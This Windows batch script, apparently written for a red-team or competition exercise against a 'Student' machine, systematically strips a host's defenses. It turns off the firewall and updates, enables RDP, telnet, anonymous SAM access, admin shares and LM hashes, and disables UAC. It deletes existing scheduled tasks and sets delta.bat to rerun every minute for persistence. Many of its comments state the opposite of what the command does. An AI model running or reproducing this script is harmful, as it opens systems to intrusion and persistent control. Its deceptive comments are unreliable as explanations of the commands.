:: Make sure to change the username and password wherver necessary
ECHO ON
color a
:: Deleted Temp Files
del /q/f/s %TEMP%\*
del /q/f/s %Windir%\Temp
:: Enable Local Administrator
net user administrator /active:yes
:: Turned on Windows Firewall and Disbaled all Firewall Exceptions
netsh firewall set opmode disable disable
:: Enabled Remote Desktop
reg add "HKLM\SYSTEM\CurrentControlSet\control\Terminal Server" /f /v fDenyTSConnections /t REG_DWORD /d 0
:: Enabled Terminal Server
reg add "HKLM\SYSTEM\CurrentControlSet\control\Terminal Server" /f /v TSEnabled /t REG_DWORD /d 1
:: Enabled RDP in Firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
:: Enabled Remote Admin
netsh advfirewall firewall set rule group="remote administration" new enable=yes
:: Unblocked Ping
netsh advfirewall firewall add rule name="All ICMP V4" dir=in action=allow protocol=icmpv4
:: Enabled ICMP Requests
netsh firewall set icmpsetting 8 DISABLE
:: Turned Windows 7 Firewall off
netsh advfirewall set allprofiles state off
:: Opened port 445 to stop Eternal Blue
netsh advfirewall firewall add rule dir=in action=allow protocol=TCP localport=445 name="Allow_TCP-445"
:: Turned on Port 445 in Regedit
reg add "HKLM\SOFTWARE\CurrentControlSet\services\NetBT\Parameters" /v SMBDeviceEnabled /t REG_DWORD /d 1 /f
:: Turned off Port 445 in firewall
netsh firewall delete portopening TCP 445
:: Enabled Server Service 
sc config "LanmanServer" start= enabled
:: Enabled Server Service 
sc config "NetLogon" start= enabled
:: Enabled Telnet
sc config tlntsvr start= enabled
:: Alternative method to disable Telnet 
net start telnet
:: Really kill telnet
reg add "HKLM\SYSTEM\CurrentControlSet\services\TlntSvr" /v Start /t REG_DWORD /d 1 /f
:: Disabled TCPIP to NETBIOS Service
sc config "LmHosts" start= enabled
:: Stopped Server Service
sc start "LanmanServer"
:: Stopped TCPIP to NETBIOS Service
sc start "LmHosts"
:: Stopped NetLogon Service
sc start "NetLogon"
:: Alternative Service to Stop Server Service
wmic service where name='LanmanServer'  call ChangeStartmode Enabled
:: Alternative Service Stop for TCPIP to NetBIOS
wmic service where name='LmHosts'  call ChangeStartmode Enabled
:: Alternative to stop NetLogin Service
wmic service where name='NetLogon' call ChangeStartmode Enabled
:: Turned off Automatic Updates
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 1 /f
:: Turned off Automatic Updates
net stop wuauserv
:: Turned off "Send LVMv2 Response Only"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v lmcompatibilitylevel /t REG_DWORD /d 0 /f
:: Unrestricted Anonymous Access
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v restrictanonymous /t REG_DWORD /d 0 /f
:: Unrestricted Anonymous SAM
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v restrictanonymoussam /t REG_DWORD /d 0 /f
:: Enabled IPv6
reg add "HKLM\SYSTEM\CurrentControlSet\services\TCPIP6\Parameters" /v DisabledComponents /t REG_DWORD /d 0 /f
:: Enabled On Screen Keyboard
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI" /f /v ShowTabletKeyboard /t REG_DWORD /d 1
:: Enabled Admin Shares
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /f /v AutoShareWks /t REG_DWORD /d 1
:: Disabled Creation of Hashes
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /f /v NoLMHash /t REG_DWORD /d 0
:: Enabled Forced UAC Permission
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
:: Enabled delta.bat Run at Startup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v delta /t REG_EXPAND_SZ /d "c:\Windows\System32\delta.bat" /f
:: Enabled Control Panel
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 0 /f 
:: Change Computer Name
reg add "HKLM\System\CurrentControlSet\Control\Computername\ActiveComputerName" /v ComputerName /t Reg_SZ /d 'Student' /f
reg add "HKLM\System\CurrentControlSet\Control\Computername\ComputerName" /v ComputerName /t Reg_SZ /d 'Student' /f
:: Created Persistent Service
sc delete deltaSRV 
:: Delete all Previously Scheduled Tasks
schtasks /delete /tn * /f
:: Deleted all Previously Scheduled Tasks XP
at /delete /yes
:: Scheduled Task for 7+ (Reruns every minute)
schtasks /create /sc minute /mo 1 /tn "delta" /tr "c:\Windows\System32\delta.bat"
:: A Quote
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /f /v LegalNoticeCaption /t REG_SZ /d "READ ME"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"  /f /v LegalNoticeText /t REG_SZ /d "There will come a time when it is not They are spying on me through my phone anymore. Eventually, it will be My phone is spying on me" 
:: Disabled Command Prompt
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 0 /f





